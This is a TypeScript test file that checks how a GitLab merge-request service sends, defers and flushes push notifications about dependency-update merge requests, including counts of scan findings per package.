describe('GitlabMergeRequestService.new-MR push notifications', () => {
  it('notifies subscribers with per-package finding counts and a resumable URL', async () => {
    const { service } = createService({}, undefined, undefined, [
      { endpoint: 'https://fcm.test/a' },
      { endpoint: 'https://fcm.test/b' },
    ]);
    vi.mocked(sendNotification).mockResolvedValue({ statusCode: 200, body: '', headers: {} });
    const mrs = [mrFixture(1, { scanFindings: [{ ruleId: 'a' }, { ruleId: 'b' }] as never }), mrFixture(2)];

    await notificationAccess(service).notifySubscribers(mrs);

    expect(sendNotification).toHaveBeenCalledTimes(2);
    const payload = JSON.parse(vi.mocked(sendNotification).mock.calls[0][1] as string) as {
      notification: { body: string; data: { onActionClick: { default: { operation: string; url: string } } } };
    };
    expect(payload.notification.body).toBe('Updates awaiting your review: pkg1 (2 findings), pkg2');
    expect(payload.notification.data.onActionClick.default.operation).toBe('navigateLastFocusedOrOpen');
    expect(payload.notification.data.onActionClick.default.url).toContain('/update-review?newMr=1,2');
  });

  it('omits finding counts when there are zero findings', async () => {
    const { service } = createService({}, undefined, undefined, [{ endpoint: 'https://fcm.test/a' }]);
    vi.mocked(sendNotification).mockResolvedValue({ statusCode: 200, body: '', headers: {} });
    const mrs = [mrFixture(1), mrFixture(2)];

    await notificationAccess(service).notifySubscribers(mrs);

    const payload = JSON.parse(vi.mocked(sendNotification).mock.calls[0][1] as string) as {
      notification: { body: string };
    };
    expect(payload.notification.body).toBe('Updates awaiting your review: pkg1, pkg2');
  });

  it('includes finding counts only when there are findings', async () => {
    const { service } = createService({}, undefined, undefined, [{ endpoint: 'https://fcm.test/a' }]);
    vi.mocked(sendNotification).mockResolvedValue({ statusCode: 200, body: '', headers: {} });
    const mrs = [
      mrFixture(1, { scanFindings: [{ ruleId: 'a' }] as never }),
      mrFixture(2),
      mrFixture(3, { scanFindings: [{ ruleId: 'b' }, { ruleId: 'c' }, { ruleId: 'd' }] as never }),
    ];

    await notificationAccess(service).notifySubscribers(mrs);

    const payload = JSON.parse(vi.mocked(sendNotification).mock.calls[0][1] as string) as {
      notification: { body: string };
    };
    expect(payload.notification.body).toBe('Updates awaiting your review: pkg1 (1 finding), pkg2, pkg3 (3 findings)');
  });

  it('sends no notification for MRs without a parseable package name', async () => {
    const { service } = createService({}, undefined, undefined, [{ endpoint: 'https://fcm.test/a' }]);
    vi.mocked(sendNotification).mockResolvedValue({ statusCode: 200, body: '', headers: {} });
    const access = notificationAccess(service);

    await access.notifySubscribers([
      mrFixture(1, { title: 'chore(update): pkg1' }),
      mrFixture(2, { title: 'WIP: random title without a version bump' }),
    ]);
    expect(sendNotification).toHaveBeenCalledTimes(1);
    const payload = JSON.parse(vi.mocked(sendNotification).mock.calls[0][1] as string) as {
      notification: { body: string };
    };
    expect(payload.notification.body).toBe('Updates awaiting your review: pkg1');
    // Unparseable titles are skipped permanently, not parked for a retry.
    expect(access.pendingNotificationIids.has(2)).toBe(false);

    await access.notifySubscribers([mrFixture(3, { title: 'Draft: something' })]);
    expect(sendNotification).toHaveBeenCalledTimes(1);
  });

  it('parks MRs whose diffs are unavailable instead of notifying', async () => {
    const { service } = createService({}, undefined, undefined, [{ endpoint: 'https://fcm.test/a' }]);
    vi.mocked(sendNotification).mockResolvedValue({ statusCode: 200, body: '', headers: {} });
    const access = notificationAccess(service);

    await access.notifySubscribers([mrFixture(7, { diffs: [] as never })]);

    expect(sendNotification).not.toHaveBeenCalled();
    expect(access.pendingNotificationIids.has(7)).toBe(true);
  });

  it('flushes parked MRs once their diffs become available and clears the park', async () => {
    const { service, cacheGet } = createService({}, undefined, undefined, [{ endpoint: 'https://fcm.test/a' }]);
    vi.mocked(sendNotification).mockResolvedValue({ statusCode: 200, body: '', headers: {} });
    const access = notificationAccess(service);
    await access.notifySubscribers([mrFixture(7, { diffs: [] as never })]);
    vi.mocked(cacheGet).mockResolvedValue([mrFixture(7)]);

    await access.flushDeferredNotifications();

    expect(sendNotification).toHaveBeenCalledTimes(1);
    expect(JSON.parse(vi.mocked(sendNotification).mock.calls[0][1] as string)).toMatchObject({
      notification: { body: 'Updates awaiting your review: pkg7' },
    });
    expect(access.pendingNotificationIids.size).toBe(0);
  });

  it('flush keeps parking while the diffs remain unavailable', async () => {
    const { service, cacheGet } = createService({}, undefined, undefined, [{ endpoint: 'https://fcm.test/a' }]);
    vi.mocked(sendNotification).mockResolvedValue({ statusCode: 200, body: '', headers: {} });
    const access = notificationAccess(service);
    await access.notifySubscribers([mrFixture(7, { diffs: [] as never }), mrFixture(9, { diffs: [] as never })]);
    vi.mocked(cacheGet).mockResolvedValue([mrFixture(7, { diffs: [] as never }), mrFixture(9, { diffs: [] as never })]);

    await access.flushDeferredNotifications();

    expect(sendNotification).not.toHaveBeenCalled();
    expect([...access.pendingNotificationIids]).toEqual([7, 9]);
  });

  it('flush notifies only the parked MRs whose diffs arrived, keeping the rest parked', async () => {
    const { service, cacheGet } = createService({}, undefined, undefined, [{ endpoint: 'https://fcm.test/a' }]);
    vi.mocked(sendNotification).mockResolvedValue({ statusCode: 200, body: '', headers: {} });
    const access = notificationAccess(service);
    await access.notifySubscribers([mrFixture(7, { diffs: [] as never }), mrFixture(9, { diffs: [] as never })]);
    vi.mocked(cacheGet).mockResolvedValue([mrFixture(7, { diffs: [] as never }), mrFixture(9)]);

    await access.flushDeferredNotifications();

    expect(sendNotification).toHaveBeenCalledTimes(1);
    expect(JSON.parse(vi.mocked(sendNotification).mock.calls[0][1] as string)).toMatchObject({
      notification: { body: 'Updates awaiting your review: pkg9' },
    });
    expect([...access.pendingNotificationIids]).toEqual([7]);
  });

  it('flush drops parked MRs that are no longer open', async () => {
    const { service, cacheGet } = createService({}, undefined, undefined, [{ endpoint: 'https://fcm.test/a' }]);
    vi.mocked(sendNotification).mockResolvedValue({ statusCode: 200, body: '', headers: {} });
    const access = notificationAccess(service);
    await access.notifySubscribers([mrFixture(7, { diffs: [] as never })]);
    vi.mocked(cacheGet).mockResolvedValue([]);

    await access.flushDeferredNotifications();

    expect(sendNotification).not.toHaveBeenCalled();
    expect(access.pendingNotificationIids.size).toBe(0);
  });
});
